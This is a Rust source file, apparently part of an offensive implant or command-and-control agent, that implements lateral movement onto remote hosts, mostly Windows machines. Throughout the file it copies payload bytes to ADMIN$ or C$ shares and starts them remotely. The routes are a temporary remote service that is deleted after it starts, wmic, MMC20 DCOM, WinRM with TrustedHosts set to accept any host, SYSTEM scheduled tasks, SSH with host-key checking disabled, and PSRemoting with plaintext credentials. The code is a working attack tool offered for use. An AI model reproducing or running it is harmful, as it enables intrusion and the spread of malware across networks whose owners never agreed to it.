/// Lateral movement methods for Windows targets.
/// All methods are Windows-only; non-Windows stubs return Err immediately.

#[cfg(target_os = "windows")]
mod inner {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::process::Command;
    use std::fs;
    use windows_sys::Win32::System::Services::{
        OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService, CloseServiceHandle,
        SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    };
    use windows_sys::Win32::Foundation::GetLastError;

    fn to_wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    fn rand_svc_name() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos();
        format!("svc{:08x}", t)
    }

    fn shell(cmd: &str) -> String {
        Command::new("cmd.exe")
            .args(["/C", cmd])
            .output()
            .map(|o| {
                let out = String::from_utf8_lossy(&o.stdout).to_string();
                let err = String::from_utf8_lossy(&o.stderr).to_string();
                format!("{}{}", out, err)
            })
            .unwrap_or_default()
    }

    /// Stage payload bytes to \\host\ADMIN$ or \\host\C$\Windows\Temp.
    /// Returns the remote local path (e.g. C:\Windows\name.exe) or Err.
    fn smb_stage(host: &str, name: &str, user: &str, pass: &str, data: &[u8]) -> Result<String, String> {
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
        }

        let unc1 = format!("\\\\{}\\ADMIN$\\{}", host, name);
        if fs::write(&unc1, data).is_ok() {
            if !user.is_empty() {
                shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
            }
            return Ok(format!("C:\\Windows\\{}", name));
        }

        let unc2 = format!("\\\\{}\\C$\\Windows\\Temp\\{}", host, name);
        if fs::write(&unc2, data).is_ok() {
            if !user.is_empty() {
                shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
            }
            return Ok(format!("C:\\Windows\\Temp\\{}", name));
        }

        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
        }
        Err("SMB staging failed (ADMIN$ and C$\\Windows\\Temp both inaccessible)".to_string())
    }

    /// Open remote SCM, create + start a service, then delete the service entry.
    /// `bin_path` is either the EXE path (psexec) or a cmd.exe wrapper (smbexec).
    unsafe fn scm_exec(host: &str, svc_name: &str, bin_path: &str) -> Result<(), String> {
        let machine = to_wide(&format!("\\\\{}", host));
        let scm = OpenSCManagerW(machine.as_ptr(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if scm == 0 {
            return Err(format!("OpenSCManager failed: {}", GetLastError()));
        }

        let wsvc = to_wide(svc_name);
        let wbin = to_wide(bin_path);
        let svc = CreateServiceW(
            scm,
            wsvc.as_ptr(),
            wsvc.as_ptr(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            wbin.as_ptr(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );
        if svc == 0 {
            CloseServiceHandle(scm);
            return Err(format!("CreateService failed: {}", GetLastError()));
        }

        StartServiceW(svc, 0, std::ptr::null());
        DeleteService(svc);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        Ok(())
    }

    pub fn lateral_psexec(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        unsafe { scm_exec(host, &svc_name, &remote_path)?; }
        Ok(format!(
            "[+] psexec → {}\n    svc : {}\n    path: {}",
            host, svc_name, remote_path
        ))
    }

    pub fn lateral_wmi(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let wmic_cmd = if !user.is_empty() {
            let (dom, usr) = if let Some(i) = user.find('\\') {
                (&user[..i], &user[i + 1..])
            } else {
                (".", user)
            };
            format!(
                "wmic /node:\"{}\" /user:\"{}\\{}\" /password:\"{}\" process call create \"{}\"",
                host, dom, usr, pass, remote_path
            )
        } else {
            format!("wmic /node:\"{}\" process call create \"{}\"", host, remote_path)
        };
        let out = shell(&wmic_cmd);
        Ok(format!(
            "[+] wmi → {}\n    path: {}\n{}",
            host,
            remote_path,
            out.trim()
        ))
    }

    pub fn lateral_smbexec(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let bin_path = format!(
            "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"{}\"",
            remote_path
        );
        unsafe { scm_exec(host, &svc_name, &bin_path)?; }
        Ok(format!(
            "[+] smbexec → {}\n    svc: {}\n    chain: SERVICES.EXE→cmd.exe→agent",
            host, svc_name
        ))
    }

    pub fn lateral_dcom(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let safe_path = remote_path.replace('"', "\\\"");
        let ps_inner = format!(
            "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{}'));\
             $c.Document.ActiveView.ExecuteShellCommand('{}',$null,'','7')",
            host, safe_path
        );
        let cmd = format!(
            "powershell -NoP -W Hidden -Exec Bypass -C \"{}\"",
            ps_inner.replace('"', "\\\"")
        );
        let out = shell(&cmd);
        Ok(format!(
            "[+] dcom → {}\n    path: {}\n{}",
            host,
            remote_path,
            out.trim()
        ))
    }

    pub fn lateral_winrm(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let trust_prefix = format!(
            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
             try{{$ip=[System.Net.Dns]::GetHostAddresses('{}')[0].IPAddressToString}}\
             catch{{$ip='{}'}};",
            host, host
        );
        let ps_inner = if !user.is_empty() {
            format!(
                "{}$c=New-Object PSCredential('{}', (ConvertTo-SecureString '{}' -AsPlainText -Force));\
                 Invoke-Command -ComputerName $ip -Credential $c -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
                trust_prefix, user, pass, remote_path
            )
        } else {
            format!(
                "{}Invoke-Command -ComputerName $ip -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
                trust_prefix, remote_path
            )
        };
        let cmd = format!(
            "powershell -NoP -W Hidden -Exec Bypass -C \"{}\"",
            ps_inner.replace('"', "\\\"")
        );
        let out = shell(&cmd);
        Ok(format!(
            "[+] winrm → {}\n    path: {}\n{}",
            host,
            remote_path,
            out.trim()
        ))
    }

    fn current_time_plus_minutes(add_minutes: u64) -> String {
        // Get UTC seconds since epoch, compute HH:MM offset by add_minutes
        use std::time::{SystemTime, UNIX_EPOCH};
        let secs = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let total_mins = (secs / 60 + add_minutes) % (24 * 60);
        format!("{:02}:{:02}", total_mins / 60, total_mins % 60)
    }

    pub fn lateral_atexec(host: &str, data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
        // Stage payload to remote host first when we have bytes; otherwise cmd_path
        // must already exist on the remote machine.
        let staged: String;
        let effective_path: &str = if !data.is_empty() {
            let exe_name = format!("{}.exe", rand_svc_name());
            staged = smb_stage(host, &exe_name, user, pass, data)?;
            &staged
        } else {
            cmd_path
        };

        let svc_name = rand_svc_name();
        // Establish authenticated IPC$ session first so /S without /U /P works.
        // Windows rejects /U /P when the target resolves to the local machine.
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
        }
        // schtasks targeting always via /S only (no explicit creds — rely on IPC$ session).
        let sch = |sub: &str| -> String {
            shell(&format!("schtasks {} /S \"{}\"", sub, host))
        };
        // Task name without leading \ to avoid syntax errors on older Windows builds.
        let task_name = svc_name.clone();
        // Schedule for current UTC time + 2 minutes so the task is not in the past.
        let st = current_time_plus_minutes(2);
        sch(&format!(
            "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST {} /RU SYSTEM /F",
            task_name, effective_path, st
        ));
        let out = sch(&format!("/Run /TN \"{}\"", task_name));
        std::thread::sleep(std::time::Duration::from_secs(3));
        sch(&format!("/Delete /TN \"{}\" /F", task_name));
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
        }
        Ok(format!(
            "[+] atexec → {}\n    task: {}\n    path: {}\n    runas: SYSTEM\n    sched: {}\n{}",
            host,
            task_name,
            effective_path,
            st,
            out.trim()
        ))
    }

    pub fn lateral_ssh(host: &str, data: &[u8], user: &str, _pass: &str) -> Result<String, String> {
        use std::time::{SystemTime, UNIX_EPOCH};
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let exe_name = format!("agent_{}.elf", ts);
        let remote_path = format!("/tmp/{}", exe_name);

        let tmp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
        let tmp_path = format!("{}\\{}", tmp_dir, exe_name);
        std::fs::write(&tmp_path, data).map_err(|e| format!("ssh: write temp: {}", e))?;

        let (ssh_host, port) = if let Some(i) = host.rfind(':') {
            (&host[..i], &host[i + 1..])
        } else {
            (host, "22")
        };

        let opts = "-o StrictHostKeyChecking=no -o BatchMode=yes";
        let scp_cmd = format!(
            "scp -P {} {} \"{}\" {}@{}:{} 2>&1",
            port, opts, tmp_path, user, ssh_host, remote_path
        );
        let ssh_cmd = format!(
            "ssh -p {} {} {}@{} \"chmod +x {} && nohup {} </dev/null >/dev/null 2>&1 &\" 2>&1",
            port, opts, user, ssh_host, remote_path, remote_path
        );
        let scp_out = shell(&scp_cmd);
        let ssh_out = shell(&ssh_cmd);
        let _ = std::fs::remove_file(&tmp_path);
        Ok(format!(
            "[+] ssh → {}\n    path: {}\nscp: {}\nssh: {}",
            host,
            remote_path,
            scp_out.trim(),
            ssh_out.trim()
        ))
    }

    pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();

        // Write payload bytes to disk when provided, unless the destination
        // is the same file the agent is currently running from (os error 32).
        let drop_path: String;
        let effective_path: &str = if !data.is_empty() {
            let fname = std::path::Path::new(cmd_path)
                .file_name()
                .map(|f| f.to_string_lossy().into_owned())
                .unwrap_or_else(|| format!("{}.exe", svc_name));
            drop_path = format!("C:\\Users\\Public\\{}", fname);
            if drop_path.to_lowercase() != cmd_path.to_lowercase() {
                fs::write(&drop_path, data)
                    .map_err(|e| format!("write payload failed: {}", e))?;
            }
            &drop_path
        } else {
            cmd_path
        };

        // PSRemoting (WinRM, logon type 3) bypasses both the interactive-logon
        // GPO restriction and NTLM loopback limits. Start-Process inside the
        // remote scriptblock creates the process without blocking: PowerShell
        // is launched with .spawn() so the agent thread returns immediately.
        runas_psremoting_spawn(effective_path, user, pass)
    }

    fn runas_psremoting_spawn(exe_path: &str, user: &str, pass: &str) -> Result<String, String> {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos();
        let tmp = format!("C:\\Users\\Public\\run_{:08x}.ps1", t);

        let safe_pass = pass.replace('\'', "''");
        let safe_user = user.replace('\'', "''");
        let safe_exe  = exe_path.replace('\'', "''");

        let script = format!(
            "$pw = ConvertTo-SecureString '{}' -AsPlainText -Force\r\n\
             $cred = New-Object PSCredential('{}', $pw)\r\n\
             Invoke-Command -ComputerName '127.0.0.1' -Credential $cred \
             -ScriptBlock {{ Start-Process '{}' }}\r\n",
            safe_pass, safe_user, safe_exe
        );

        fs::write(&tmp, script.as_bytes())
            .map_err(|e| format!("runas_psremoting: write ps1 failed: {}", e))?;

        // .spawn() — PowerShell runs in background, agent is NOT blocked.
        // The ps1 is read by PowerShell within ~1s of launch, so a short
        // sleep before cleanup is sufficient.
        let _child = Command::new("powershell.exe")
            .args([
                "-NonInteractive",
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-File", &tmp,
            ])
            .spawn()
            .map_err(|e| format!("runas_psremoting: spawn failed: {}", e))?;

        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = fs::remove_file(&tmp);

        Ok(format!(
            "[+] runas → {} (PSRemoting)\n    path: {}\n",
            user, exe_path
        ))
    }

    pub fn run_lateral(
        method: &str,
        host: &str,
        data: &[u8],
        cmd: &str,
        user: &str,
        pass: &str,
    ) -> Result<String, String> {
        match method {
            "psexec" => lateral_psexec(host, data, user, pass),
            "wmi" => lateral_wmi(host, data, user, pass),
            "smbexec" | "smb" => lateral_smbexec(host, data, user, pass),
            "dcom" => lateral_dcom(host, data, user, pass),
            "winrm" => lateral_winrm(host, data, user, pass),
            "ssh" => lateral_ssh(host, data, user, pass),
            "atexec" | "at" => lateral_atexec(host, data, cmd, user, pass),
            "runas" => lateral_runas(data, cmd, user, pass),
            _ => Err(format!(
                "unknown method: {} — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas",
                method
            )),
        }
    }
}

pub fn run_lateral(
    method: &str,
    host: &str,
    data: &[u8],
    cmd: &str,
    user: &str,
    pass: &str,
) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        inner::run_lateral(method, host, data, cmd, user, pass)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (method, host, data, cmd, user, pass);
        Err("LATERAL: not supported on Linux".to_string())
    }
}
